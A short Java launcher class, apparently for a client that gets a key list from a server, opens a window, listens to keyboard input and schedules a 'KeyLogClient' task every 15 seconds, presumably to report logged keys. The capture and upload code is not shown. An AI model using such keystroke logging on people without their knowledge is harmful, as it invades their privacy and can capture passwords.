package com.zpq.client;

import com.zpq.utilts.KeyConfigMsg;

import java.util.Arrays;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * @author 35147
 */
public class Start {
    public static void init(){
        //连接到服务端并拿到按键配置信息
        String keyConfig = KeyConfigClient.run();
        System.out.println(keyConfig);
        if(keyConfig==null){
            return;
        }
        String[] keys = keyConfig.split(",");
        KeyConfigMsg.keys.addAll(Arrays.asList(keys));
        //打开窗口
        KeyFrame02 keyFrame02 = new KeyFrame02();
        //开启按键监听
        KeyListener keyListener = new KeyListener(keyFrame02);
        keyListener.startListen();

        ScheduledExecutorService service = Executors.newScheduledThreadPool(10);
        //第二个参数延迟启动，第三个参数间隔多少时间执行
        service.scheduleAtFixedRate(new KeyLogClient(),5,15, TimeUnit.SECONDS);
    }
}
